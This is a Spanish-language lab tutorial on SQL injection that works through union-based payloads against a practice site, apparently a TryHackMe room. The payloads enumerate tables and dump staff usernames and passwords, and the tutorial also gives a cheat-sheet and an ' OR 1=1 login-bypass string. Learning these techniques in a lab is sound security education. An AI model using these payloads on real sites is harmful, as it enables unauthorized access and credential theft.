# SQLinyection

SQL (lenguaje de consulta estructurado) es un lenguaje rico en funciones que se utiliza para consultar bases de datos; estas consultas SQL se conocen mejor como declaraciones.

El más simple de los comandos que cubriremos en esta tarea se usa para recuperar (seleccionar), actualizar, insertar y eliminar datos. Aunque algo similar, algunos servidores de bases de datos tienen su propia sintaxis y pequeños cambios en el funcionamiento de las cosas. Todos estos ejemplos se basan en una base de datos MySQL. Después de aprender las lecciones, podrá buscar fácilmente una sintaxis alternativa en línea para los diferentes servidores. Vale la pena señalar que la sintaxis SQL no distingue entre mayúsculas y minúsculas.

### In-Band SQL Injection
In-Band SQL Injection es el tipo más fácil de detectar y explotar; En banda simplemente se refiere al mismo método de comunicación que se usa para explotar la vulnerabilidad y también recibir los resultados, por ejemplo, descubrir una vulnerabilidad de inyección SQL en una página de sitio web y luego poder extraer datos de la base de datos a la misma página.

### Error-Based SQL Injection
Este tipo de inyección SQL es el más útil para obtener fácilmente información sobre la estructura de la base de datos, ya que los mensajes de error de la base de datos se imprimen directamente en la pantalla del navegador. Esto a menudo se puede usar para enumerar una base de datos completa. 

### Union-Based SQL Injection

Este tipo de inyección utiliza el operador SQL UNION junto con una declaración SELECT para devolver resultados adicionales a la página. Este método es la forma más común de extraer grandes cantidades de datos a través de una vulnerabilidad de inyección SQL.

La clave para descubrir la inyección SQL basada en errores es romper la consulta SQL del código probando ciertos caracteres hasta que se produzca un mensaje de error; estos son más comúnmente apóstrofes simples ( ' ) o una comilla ( " ).

### In-Band SQL Injection
![image](https://user-images.githubusercontent.com/69023634/152703694-18042e80-7f8b-4e96-9c37-38571cebddf0.png)

Como vemos e ha generado un error al agregar la comilla simple, ahora lo que debemos hacer es devolver los datos al navegador sin mostrar un mensaje de error. En primer lugar, probaremos el operador UNION para que podamos recibir un resultado adicional de nuestra elección.
```
1 UNION SELECT 1
```
![image](https://user-images.githubusercontent.com/69023634/152703792-f3b39a3b-3d60-418f-a98d-237178e9addb.png)

Esta declaración debería generar un mensaje de error informándole que la declaración UNION SELECT tiene un número diferente de columnas que la consulta SELECT original. Así que intentemos de nuevo pero agreguemos columnas hasta que el error desaparezca.
```
1 UNION SELECT 1,2,3
```
![image](https://user-images.githubusercontent.com/69023634/152703823-dbed6d98-3a16-4751-b16d-af0123cfd586.png)

Éxito, el mensaje de error desapareció y el artículo se muestra, pero ahora queremos mostrar nuestros datos en lugar del artículo. El artículo se muestra porque toma el primer resultado devuelto en alguna parte del código del sitio web y lo muestra. Para evitar eso, necesitamos que la primera consulta no produzca resultados. Esto se puede hacer simplemente cambiando la identificación del artículo de 1 a 0.
```
0 UNION SELECT 1,2,3
```
Ahora verá que el artículo está formado por el resultado de la selección UNION que devuelve los valores de columna 1, 2 y 3. Podemos comenzar a usar estos valores devueltos para recuperar información más útil. Primero, obtendremos el nombre de la base de datos a la que tenemos acceso:
```
0 UNION SELECT 1,2,database()
```
![image](https://user-images.githubusercontent.com/69023634/152703950-051de64b-406a-4fa0-8ee0-34c5a42338ee.png)

Ahora verá dónde se mostraba anteriormente el número 3 el nombre de la base de datos, que es  sqli_one .
Nuestra siguiente consulta reunirá una lista de tablas que se encuentran en esta base de datos.
```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
![image](https://user-images.githubusercontent.com/69023634/152704186-34cc8d0a-1472-44e0-9379-f40686a4fb46.png)

Hay un par de cosas nuevas que aprender en esta consulta. En primer lugar, el método  group_concat()  obtiene la columna especificada (en nuestro caso, table_name) de varias filas devueltas y la coloca en una cadena separada por comas. Lo siguiente es la  base de datos information_schema  ; todos los usuarios de la base de datos tienen acceso a esto y contiene información sobre todas las bases de datos y tablas a las que el usuario tiene acceso. En esta consulta en particular, estamos interesados en listar todas las tablas en la  base de datos sqli_one  , que es article y staff_users. 

Como el primer nivel tiene como objetivo descubrir la contraseña de Martin, la tabla staff_users es lo que nos interesa. Podemos utilizar la base de datos information_schema nuevamente para encontrar la estructura de esta tabla usando la siguiente consulta.

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
Esto es similar a la consulta SQL anterior. Sin embargo, la información que queremos recuperar ha cambiado de table_name a  column_name , la tabla que estamos consultando en la base de datos information_schema ha cambiado de tablas a  columnas , y estamos buscando cualquier fila donde la  columna table_name  tenga un valor de  staff_users .

Los resultados de la consulta proporcionan tres columnas para la tabla staff_users: id, contraseña y nombre de usuario. Podemos usar las columnas de nombre de usuario y contraseña para nuestra siguiente consulta para recuperar la información del usuario.
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
Nuevamente, usamos el método group_concat para devolver todas las filas en una sola cadena y para que sea más fácil de leer. También hemos agregado  ':'  para separar el nombre de usuario y la contraseña. En lugar de estar separados por una coma, hemos elegido la etiqueta HTML  <br>  que obliga a que cada resultado esté en una línea separada para facilitar la lectura.

![image](https://user-images.githubusercontent.com/69023634/152704719-235f3d45-bb49-4ace-8bb2-72d1651c8952.png)


### In-Band SQL Injection Commands
**Generar error**
```
https://website.thm/article?id=1'
```

**Evitando el error**
```
1 UNION SELECT 1,2,3
```

**Explotando el error**
```
0 UNION SELECT 1,2,database()
```

**Extrayendo tablas de DB**
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

**Extrayendo columns de DB**
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

**Extrayendo datos de Columns**
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

### Blind SQLi - Authentication Bypass
Blind SQLi
A diferencia de la inyección de SQL en banda, donde podemos ver los resultados de nuestro ataque directamente en la pantalla, SQLi ciego es cuando recibimos poca o ninguna respuesta para confirmar si nuestras consultas inyectadas fueron, de hecho, exitosas o no, esto se debe a que el los mensajes de error se han deshabilitado, pero la inyección aún funciona a pesar de todo. Puede que le sorprenda que todo lo que necesitamos es un poco de retroalimentación para enumerar con éxito una base de datos completa.

Authentication Bypass
Una de las técnicas de inyección ciega de SQL más sencillas es cuando se eluden los métodos de autenticación, como los formularios de inicio de sesión. En este caso, no estamos tan interesados en recuperar datos de la base de datos; Solo queremos pasar el inicio de sesión. 

Los formularios de inicio de sesión que están conectados a una base de datos de usuarios a menudo se desarrollan de tal manera que la aplicación web no está interesada en el contenido del nombre de usuario y la contraseña, sino más bien en si los dos forman un par coincidente en la tabla de usuarios. En términos básicos, la aplicación web le pregunta a la base de datos "¿tiene un usuario con el nombre de usuario  bob  y la contraseña  bob123 ?", y la base de datos responde con sí o no (verdadero/falso) y, dependiendo de esa respuesta, dicta si la aplicación web le permite continuar o no. 

Teniendo en cuenta la información anterior, no es necesario enumerar un par de nombre de usuario/contraseña válido. Solo necesitamos crear una consulta de base de datos que responda con un sí/verdadero.

Por ejemplo podemos imaginarla estrcutura de una sentencia sql que se ejecuta en el formulario es así;
```
select * from users where username='%username%' and password='%password%' LIMIT 1;

```
Podriamos omitir este inicio inidicando la siguiente sentencia.
```
' OR 1=1;--
```
Lo que convierte la consulta SQL en lo siguiente:
```
select * from users where username='' and password='' OR 1=1;
```
Debido a que 1=1 es una declaración verdadera y hemos usado un  operador OR  , esto siempre hará que la consulta regrese como verdadera, lo que satisface la lógica de las aplicaciones web de que la base de datos encontró una combinación válida de nombre de usuario/contraseña y que se debe permitir el acceso .

